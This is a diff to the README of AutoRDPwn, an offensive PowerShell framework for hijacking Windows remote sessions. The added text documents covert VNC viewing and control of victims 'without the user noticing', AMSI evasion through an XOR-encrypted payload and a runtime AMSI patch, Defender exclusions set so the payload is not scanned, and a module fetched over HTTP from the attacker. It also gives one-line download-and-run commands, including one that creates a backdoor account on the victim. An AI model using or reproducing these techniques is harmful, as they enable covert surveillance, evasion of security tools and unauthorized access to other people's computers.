@@ -21,15 +21,23 @@ Powershell 4.0 or higher
 
 • Delivery through an ephemeral scheduled task running as SYSTEM, registered and unregistered automatically in every run
 
+• The target side stages only temporary scripts under C:\Windows\Temp and removes them after execution; the VNC module is fetched over HTTP from the attacker and decoded in memory before it runs
+
 • View mode uses an UltraVNC reverse connection: the target connects back to the attacker's listener, so no inbound firewall rule is needed on the victim
 
 • Shot mode captures a full-resolution PNG of the target screen and pulls it back over the existing WinRM channel
 
-• VNC module delivery is AMSI-evasive: the payload travels XOR-encrypted and is patched at runtime before execution
+• VNC module delivery is AMSI-evasive: the payload travels XOR-encrypted over HTTP and is patched at runtime before execution, with the AMSI patch built from char codes so no plaintext indicator is present
+
+• Unified menu: attack vectors and all modules live in a single arrow-key TUI, there is no separate modules screen any more
+
+• Defender exclusions and the SYSTEM task run before the payload lands, so the decode/execute step is not scanned
 
 • Every attack in every menu now shows a short description of what it does and what it is for, in all seven languages
 
 • Fixed Handle leaks and P/Invoke marshaling errors in the token engine (wtsapi32, kernel32 and advapi32 signatures)
+
+• Elevation is now requested with a normal UAC prompt when not running as Administrator; -noadmin keeps the menu unelevated
 
 ## Version 5.1
 • Many bugs fixed
@@ -62,13 +70,20 @@ When used remotely in a reverse shell, it is necessary to use the following para
 
 | Parameter               | Description                                                                                    | 
 | :---------------------- | :--------------------------------------------------------------------------------------------- | 
-| **-admin / -noadmin**   | Depending on the permissions we have, we will use one or the other                             |
+| **-noadmin**            | Keeps the menu in the current console, without requesting elevation                            |
 | **-nogui**              | This will avoid loading the menu and some colors, guaranteed its functionality                 | 
 | **-lang**               | We will choose our language (English, Spanish, French, German, Italian, Russian or Portuguese) |
-| **-option**             | As with the menu, we can choose how to launch the attack                                       |
+| **-option**             | Action ID to run directly (1-8, 101-704); legacy aliases 11-17 are still accepted              |
 | **-shadow**             | We will decide if we want to see or control the remote device                                  |
 | **-createuser**         | This parameter is optional, the user AutoRDPwn:AutoRDPwn will be created on the victim machine |
-| **-noclean**            | Disables the process of undoing all changes on the victim computer                             |
+| **-noclean**            | Skips target/user artifact cleanup; Defender exclusions are still restored                     |
+
+### Running the menu
+When the console is not running as Administrator, AutoRDPwn requests elevation with a normal UAC prompt. If the prompt is cancelled, it prints an error and exits.
+
+• Run the terminal as **Administrator** - the menu starts directly
+
+• Launch with **-noadmin** - keeps the menu in the current console, without elevation
 
 **Local execution on one line:**
 ```
@@ -77,7 +92,7 @@ powershell -ep bypass "cd $env:temp ; iwr https://raw.githubusercontent.com/jeko
 
 **Example of remote execution on a line:**
 ```
-powershell -ep bypass "cd $env:temp ; iwr https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/AutoRDPwn.ps1 -outfile AutoRDPwn.ps1 ; .\AutoRDPwn.ps1 -admin -nogui -lang English -option 4 -shadow control -createuser"
+powershell -ep bypass "cd $env:temp ; iwr https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/AutoRDPwn.ps1 -outfile AutoRDPwn.ps1 ; .\AutoRDPwn.ps1 -nogui -lang English -option 4 -shadow control -createuser"
 ```
 
 
@@ -87,6 +102,19 @@ https://darkbyte.net/autordpwn-la-guia-definitiva
 
 
 # Stealth Screen module
+## Quick Screen (menu option 8)
+The main menu includes a dedicated shortcut, so the whole flow is: target, user, password, your IP, and whether you want control or view only. The attacker IP defaults to the first non-loopback IPv4 detected on your machine, and the listener uses port 5500.
+
+```
+[8] - Quick Screen (Stealth VNC)
+     Watch or control the target screen without the user noticing
+```
+
+```
+powershell -ep bypass "cd $env:temp ; iwr https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/AutoRDPwn.ps1 -outfile AutoRDPwn.ps1 ; .\AutoRDPwn.ps1 -option 8"
+```
+
+## Direct usage
 This module can also be used directly, outside the framework menu:
 
 ```powershell
@@ -109,6 +137,7 @@ Invoke-StealthScreen -Target 192.168.1.100 -User administrator -Pass Password123
 | **-Port**        | Port of the VNC listener, default 5500                                                            |
 | **-Password**    | VNC password, maximum 8 characters, default AutoRDPw                                              |
 | **-Path**        | Temporary path on the victim, default C:\Windows\Temp                                             |
+| **-ViewOnly**    | Watch the screen without sending input, the listener runs with `/viewonly` (view mode only)      |
 
 Requirements for the target: Windows with PowerShell 5.1 and WinRM enabled. The victim user sees nothing: the payload runs hidden in his own console session.
 
